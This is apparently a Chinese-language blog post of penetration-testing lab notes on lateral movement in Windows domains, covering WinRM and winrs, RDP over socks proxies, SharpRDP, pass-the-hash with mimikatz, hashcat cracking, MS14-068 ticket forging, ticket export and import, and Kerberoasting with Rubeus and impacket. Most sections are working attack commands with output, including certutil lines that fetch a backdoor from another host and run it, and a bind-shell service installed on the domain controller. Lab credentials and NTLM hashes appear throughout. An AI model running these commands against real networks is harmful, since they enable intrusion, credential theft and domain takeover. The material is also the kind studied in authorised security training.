<p>1.探针可用：</p>
<p>端口扫描5985，在此之前我们先打开3.31的winrm服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line">winrm <span class="built_in">set</span> winrm/config/Client @&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153456989.png" alt="image-20250517153456989" style="zoom:80%;" />

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153505811.png" alt="image-20250517153505811" style="zoom:80%;" />

<p>扫端口发现3.31和3.32的5985端口开放，可以通过此方法来横向移动。</p>
<p>2.连接执行：通过winrs来执行远程命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 whoami</span><br><span class="line">winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250125232150743.png" alt="image-20250125232150743"></p>
<p>反弹shell就是让他下载后门然后执行即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/3232.exe 3232.exe &amp; 3232.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250125232708603.png" alt="image-20250125232708603"></p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153525699.png" alt="image-20250517153525699" style="zoom:80%;" />



<p>上述操作是在本机上进行的，是由图形化界面的，但是在cs上执行不了。。鸡肋了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250125232807295.png" alt="image-20250125232807295"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250125232812318.png" alt="image-20250125232812318"></p>
<p>这又是为啥呢？小迪表示是cs命令终端的回显导致的。</p>
<p>实战中不太现实。解决办法也是有的，如下所示：（通过winrm.cmd来进行命令执行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/3232.exe 3232.exe &amp; 3232.exe&quot;&#125; -r:sqlserver -u:sqlserver\administrator -p:admin!@#45</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153547287.png" alt="image-20250517153547287" style="zoom:80%;" />

<p>由于是正向后门，然后我们去connect</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153556607.png" alt="image-20250517153556607" style="zoom:80%;" />



<p><strong>cs插件按理来说也是可行的。</strong>但是我试了不行。。莫非是cs问题？？还是环境问题？？不知道。。</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153609534.png" alt="image-20250517153609534" style="zoom:80%;" />



<h4 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h4><p>远程桌面服务 支持明文及Hash连接</p>
<p>条件：对方开启RDP服务 远程桌面</p>
<p>1.探针连接：端口扫描3389</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126183923542.png" alt="image-20250126183923542"></p>
<p>都开了。</p>
<p>接下来就是要利用RDP来进行横向移动了，我们直接跑到web主机上进行rdp远程连接？不现实！我们可以通过以下两种方式，在自己的攻击机上进行横向移动</p>
<p>1.端口转发映射</p>
<p>被控机是web服务器嘛，我们先给他搞个webshell后门，使用冰蝎中的内网穿透http隧道来完成。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153638548.png" alt="image-20250517153638548"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153650436.png" alt="image-20250517153650436"></p>
<p>我们目前连接是肯定连接不上的，毋庸置疑</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153658576.png" alt="image-20250517153658576" style="zoom:80%;" />

<p>开启http隧道，进行端口映射后</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153708603.png" alt="image-20250517153708603" style="zoom:80%;" />

<p>However，可能是因为流量太大了，不好搞啊！但是思路是没有问题的。</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153724320.png" alt="image-20250517153724320" style="zoom:80%;" />



<p>frp nps iox都需要把这个文件上传到3.32上才能</p>
<p>需要在目标机上传文件，由于我们本身就没有控制它，又怎么上传文件呢？臆想。。</p>
<p>唯一能解决的是http隧道，但又由于流量太大不可取了。因此还是下面的socks代理比较好！</p>
<p>2.socks代理</p>
<p>建立socks节点后然后本机上可以使用mstsc来进行rdp连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126184723635.png" alt="image-20250126184723635"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250126184803199.png" alt="image-20250126184803199"></p>
<h5 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h5><p>只支持明文连接</p>
<p>是一款可以不借助远程桌面GUI的情况下，通过RDP协议进行命令执行的程序</p>
<p><a target="_blank" rel="noopener" href="https://github.com/0xthirteen/SharpRDP">https://github.com/0xthirteen/SharpRDP</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpRDP.exe computername=192.168.3.32 command=&quot;certutil -urlcache -split -f http://192.168.3.31/3232.exe c:/3232.exe&quot; username=Administrator password=admin!@#45</span><br></pre></td></tr></table></figure>





<h4 id="PTH-PTT-PTK"><a href="#PTH-PTT-PTK" class="headerlink" title="PTH&amp;PTT&amp;PTK"></a>PTH&amp;PTT&amp;PTK</h4><p>path the hash（哈希传递攻击） 利用lm或ntlm的值进行的渗透测试（NTLM认证攻击）</p>
<p>path the ticket（票据传递攻击）  利用票据凭证TGT进行渗透测试（Kerberos认证攻击）</p>
<p>path the key（密钥传递攻击） 利用ekeys aes256进行的渗透测试（NTLM认证攻击）</p>
<p><strong>逻辑思路：</strong></p>
<p>明文传递 -&gt; PTH -&gt; PTT -&gt; PTK（AES）</p>
<p>关于LM和NTLM文章：<a target="_blank" rel="noopener" href="https://y4er.com/posts/ntlm-hash-and-lm-hash/">https://y4er.com/posts/ntlm-hash-and-lm-hash/</a></p>
<h5 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h5><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250127163039946.png" alt="image-20250127163039946"></p>
<img src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/9dc978b4-1bca-a900-8192-c650ce01b7e9.png" alt="image.png" style="zoom:80%;" />



<p>利用思路：</p>
<p>1.利用直接的Hash传递。这里其实就是之前所说的通过hash来进行传递，而不是明文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.mimikatz</span><br><span class="line">mimikatz privilege::debug</span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c #向计算机中写入内存，在当前电脑的内存中写入 连接3.32时采用administrator和后面的hash来连接</span><br><span class="line">net use \\192.168.3.32\c$ #连接成功后就可以进行后续的IPC横向移动操作了</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129172138945.png" alt="image-20250129172138945"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517153827246.png" alt="image-20250517153827246"></p>
<p>这里执行成功后执行dir是不可以的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131182426305.png" alt="image-20250131182426305"></p>
<p>然而，mimikatz sekurlsa::pth &#x2F;user:administrator &#x2F;domain:192.168.3.32 &#x2F;ntlm:518b98ad4178a53695dc997aa02d455c该命令执行成功后，web主机会弹出一个cmd，要在这边dir才行阿巴阿巴。这种方法就不太现实了，因为需要图形化界面。。。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131182533353.png" alt="image-20250131182533353"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.impacket套件</span><br></pre></td></tr></table></figure>



<p>2.利用hash转成ptt传递</p>
<p>见ptt处利用NTLM</p>
<p>3.利用hash进行暴力破解明文</p>
<p><strong>hashcat</strong> 利用枚举碰撞来破解</p>
<p><a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 1000 --force 518b98ad4178a53695dc997aa02d455c pass.txt</span><br><span class="line">-m 1000代表NTLM类型</span><br></pre></td></tr></table></figure>

<p>-m 密文类型</p>
<p>-a 破解类型</p>
<p>?l 小写</p>
<p>?s 符号</p>
<p>?d 数字</p>
<p>字典破解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -a 0 -m 1000 hash.txt pass.txt</span><br></pre></td></tr></table></figure>



<p>暴力破解：（掩码爆破）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -a 3 -m 1000 518b98ad4178a53695dc997aa02d455c ?l?l?l?l?l?s?s?s?d?d</span><br></pre></td></tr></table></figure>



<p>4.修改注册表重启进行获取明文</p>
<p>后续会说</p>
<h5 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.利用漏洞</span><br><span class="line">2.利用NTLM</span><br><span class="line">3.利用历史遗留</span><br><span class="line">4.利用加密类型</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a></p>
<p> 一次详细的Kerberoast攻击演示：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/174967.html">https://www.freebuf.com/articles/system/174967.html</a></p>
<h6 id="基于漏洞"><a href="#基于漏洞" class="headerlink" title="基于漏洞"></a>基于漏洞</h6><p>1.漏洞-MS14068(webadmin权限)-利用漏洞生成的用户的新身份票据尝试认证</p>
<p>MS14-068 是密钥分发中心（KDC）服务中的Windows漏洞</p>
<p>它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC</p>
<p>该漏洞位于kdcsvc.dll域控制器的密钥分发中心（KDC）中</p>
<p>用户可以通过呈现具有改变的PAC的Kerberos TGT来获取票证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取SID值：shell whoami/user</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129122525431.png" alt="image-20250129122525431"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-1218902331-2157346161-1782232778-1132</span><br></pre></td></tr></table></figure>

<p>然后上传exe</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129122946666.png" alt="image-20250129122946666"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#利用漏洞生成票据</span><br><span class="line">shell MS14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129130316670.png" alt="image-20250129130316670"></p>
<p>然后ls一下发现多出了票据文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129130452581.png" alt="image-20250129130452581"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129130723851.png" alt="image-20250129130723851"></p>
<p>在没有导入票据之前我们dir是不行的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell klist #查看票据</span><br><span class="line">shell klist purge  #清除票据连接</span><br></pre></td></tr></table></figure>

<p>为了真实有效，我们先删除之前的票据</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129130832955.png" alt="image-20250129130832955"></p>
<p>然后，我们使用mimikatz内存导入票据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc TGT_webadmin@god.org.ccache</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129131111791.png" alt="image-20250129131111791"></p>
<p>接着我们klist一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129131145901.png" alt="image-20250129131145901"></p>
<p>就是我们刚刚导入的票据！</p>
<p>然后就能正常dir等操作了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129131243076.png" alt="image-20250129131243076"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\OWA2010CN-God.god.org\C$</span><br><span class="line">copy 3232.exe \\OWA2010CN-God.god.org\C$</span><br><span class="line">sc \\OWA2010CN-God.god.org create bindshell binpath= &quot;c:\3232.exe&quot;</span><br><span class="line">sc \\OWA2010CN-God.god.org start bindshell</span><br><span class="line">注意：成功不成功看DC域控漏洞补丁打没打</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129131641660.png" alt="image-20250129131641660"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129131725394.png" alt="image-20250129131725394"></p>
<p>然后可以dir一下，发现成功复制</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129131748091.png" alt="image-20250129131748091"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129131948557.png" alt="image-20250129131948557"></p>
<p>上述注册binpath&#x3D;后面的一个空格，不然会报help</p>
<p>然后执行任务，connect连接，成功上线dc</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129132259137.png" alt="image-20250129132259137"></p>
<p>但是有个小bug？莫非是工具的问题？过了一小段时间就失效了，可能需要权限维持。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129133947442.png" alt="image-20250129133947442"></p>
<h6 id="利用NTLM"><a href="#利用NTLM" class="headerlink" title="利用NTLM"></a>利用NTLM</h6><p>这种方法其实就是之前PTH中利用hash转成ptt传递，下面的方法就是将NTLM生成一个票据来进行攻击。为什么呢？因为之前的PTH是通过hash来进行传递，同时是通过各种协议来进行横向移动的，如WMI,SMB等协议，而关于这些协议的横向移动可能会受到防火墙的影响，而这种Hash转成ptt传递可以规避防火墙的影响！</p>
<p>kekeo(高权限，需NTLM)-利用获取的NTLM生成新的票据尝试认证</p>
<p>因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗。</p>
<p>缺点：票据是有有效期的，所以如果当前主机在连接过域控的话，有效期内可利用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#生成票据</span><br><span class="line">shell kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129163745966.png" alt="image-20250129163745966"></p>
<p>ls发现新生成了一个票据文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129163821954.png" alt="image-20250129163821954"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#导入票据</span><br><span class="line">shell kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129163927402.png" alt="image-20250129163927402"></p>
<p>接着我们klist一下发现成功导入</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129163946951.png" alt="image-20250129163946951"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250129164036062.png" alt="image-20250129164036062"></p>
<p>成功通信上了，上线操作其实就是之前的。这里就不重复了。。。</p>
<h6 id="利用历史遗留"><a href="#利用历史遗留" class="headerlink" title="利用历史遗留"></a>利用历史遗留</h6><p>mimikatz(高权限,需Ticket)-利用历史遗留的票据重新认证尝试</p>
<p>在这台主机上登陆过域控或者域控主动登陆过你，那就会有记录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#导出票据：</span><br><span class="line">mimikatz sekurlsa::tickets /export</span><br><span class="line"></span><br><span class="line">#注意一下，这里要用system权限来导出，否则会报error错误，因为权限太低</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154038314.png" alt="image-20250517154038314" style="zoom:80%;" />

<p>接着我们可以ls一下，发现多了好多东西</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154047108.png" alt="image-20250517154047108" style="zoom:80%;" />

<p>域内有策略限制，当我们执行一些操作如配置ip地址、安装软件、更改防火墙设置，是受到域控管理的，需要在计算机上登录域控用户，取得同意，要么就是在域控机子登录webserver，用域控的权限去操作他。不管是哪种方法，都会留下域控的登录信息，包括登陆的账号密码！所以我们就可以通过该历史遗留！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250130163144389.png" alt="image-20250130163144389"></p>
<p>这个漏洞存在的关键点就是有没有与域控产生过连接。</p>
<p>接下来我们模拟产生连接！登陆一下。然后我们再导出票据，看看会不会多出什么东西。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250130163819799.png" alt="image-20250130163819799"></p>
<p>额。。。没有多出来，莫非是这种PAC的账号密码输进去没用？试一下直接在web主机上登录域控账号。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250130164254600.png" alt="image-20250130164254600"></p>
<p>然后再去导出一次！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250130164348050.png" alt="image-20250130164348050"></p>
<p>芜湖！！！Administrator出来啦！</p>
<p>一般情况下我们先用40开头的，不行的话换60开头的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250130164539718.png" alt="image-20250130164539718"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#导入票据</span><br><span class="line">mimikatz kerberos::ptt [0;10d05a]-2-1-40e00000-Administrator@krbtgt-GOD.ORG.kirbi</span><br><span class="line"></span><br><span class="line">mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;22d3a]-2-1-40e00000-Administrator@krbtgt-god.org.kirbi</span><br></pre></td></tr></table></figure>

<p>在导入之前我们先尝试连接一下看看，当然是不可以的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250130164743927.png" alt="image-20250130164743927"></p>
<p>然后我们导入票据再连接，此处我把票据文件放到桌面上了，所以不用加路径！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250130164845986.png" alt="image-20250130164845986"></p>
<p>芜湖成功啦！然后后面的工作大家都懂了，复制后门，创建服务，启动服务然后上线。</p>
<p><strong>总结：曾经域控登陆过你的主机或者你登录过域控</strong></p>
<h6 id="利用加密类型"><a href="#利用加密类型" class="headerlink" title="利用加密类型"></a>利用加密类型</h6><p>Rubeus&amp;Impacket（高权限,需Ticket）-利用通讯的加密类型票据进行爆破明文，简单理解一下就是RC4加密类型比较容易破解，其实本质就是暴力破解票据！</p>
<p>Kerberos攻击条件：</p>
<p>采用rc4加密类型的票据，工具Rubeus&amp;impacket检测或看票据加密类型</p>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
<p>Kerberoasting攻击的利用：</p>
<ul>
<li>SPN服务发现</li>
<li>请求服务票据</li>
<li>服务票据的导出</li>
<li>服务票据的暴力破解</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SPN 是服务在使用 Kerberos 身份验证的网络上的唯一标识符。</span><br><span class="line">Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。一个用户账户下可以有多个SPN，但一个SPN只能注册到一个账户。在内网中，SPN扫描通过查询向域控服务器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端，交换机等。SPN的识别是kerberoasting攻击的第一步。</span><br></pre></td></tr></table></figure>



<p>判断加密类型可以通过手工和工具的方法，工具需要考虑免杀等</p>
<blockquote>
<p>手工：</p>
<p>先用spn去获取有哪些通讯的服务</p>
<p>再去连接通讯这个服务 产生票据</p>
<p>查看票据的加密通讯类型</p>
</blockquote>
<p><strong>手工判断加密类型</strong></p>
<p>扫描当前域内服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -T god.org -q */*</span><br><span class="line">powershell setspn -T god.org -q */* |findstr &quot;MSSQL&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154133548.png" alt="image-20250517154133548"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154141344.png" alt="image-20250517154141344"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#这行代码加载 System.IdentityModel 程序集，使 PowerShell 能够使用该程序集中的类，例如System.IdentityModel.Tokens.KerberosRequestorSecurityToken。</span><br><span class="line">powershell Add-Type -AssemblyName System.IdentityModel</span><br><span class="line"></span><br><span class="line">#请求 Kerberos 认证，获取一个用于访问 MSSQLSvc/SqlServer.god.org:1433 的 Kerberos 票据。</span><br><span class="line">powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/SqlServer.god.org:1433&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131123412368.png" alt="image-20250131123412368"></p>
<p>klist发现啥也没有，这个不行。。</p>
<p>那么用mimikatz试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#该命令的作用是 请求 SQL Server（MSSQLSvc）的 Kerberos 票据</span><br><span class="line">mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131123727075.png" alt="image-20250131123727075"></p>
<p>klist发现多出了票据！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154157998.png" alt="image-20250517154157998"></p>
<p>看会话密钥类型，说明这个票据采用的是AES-256-CTS-HMAC-SHA1-96加密。这种情况我们就玩不了，我们需要RC4！</p>
<p><strong>工具判断加密类型</strong></p>
<p>Rubeus berkeroast</p>
<p>impacket-getuserspns</p>
<p>我们先把Rubeus工具上传一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131125616299.png" alt="image-20250131125616299"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell Rubeus kerberoast</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154213782.png" alt="image-20250517154213782"></p>
<p>此类攻击方法在当前主机不行，因为我们之前看过，加密类型不是RC4的</p>
<p>那么接下来我们换一个域环境-0day.org，上线有与kali同一网段的jack主机</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131153845767.png" alt="image-20250131153845767"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接用工具判断票据加密类型</span><br><span class="line">shell Rubeus kerberoast</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154230767.png" alt="image-20250517154230767"></p>
<p>存在攻击的点！以上是用Rubeus工具，接下来用impacket套件试试</p>
<p>首先在信息收集阶段，我们需要知道DC的ip地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131161016475.png" alt="image-20250131161016475"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请求所有SPN服务器，并找到能破解的票据格式保存到hash.txt</span><br><span class="line">python GetUserSPNs.py -request -dc-ip 192.168.3.142 0day.org/ja</span><br><span class="line">ck:admin!@#45 -outputfile hash.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131161327798.png" alt="image-20250131161327798"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131161340470.png" alt="image-20250131161340470"></p>
<p>其实我们直接klist也可以知道加密类型</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154257816.png" alt="image-20250517154257816" style="zoom:80%;" />



<p>接下来再通过手工的方法重现一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell setspn -T 0day.org -q */*</span><br><span class="line">powershell Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131162114623.png" alt="image-20250131162114623"></p>
<p>再尝试了一下powershell的方法，还是不行，那就用mimikatz吧。。</p>
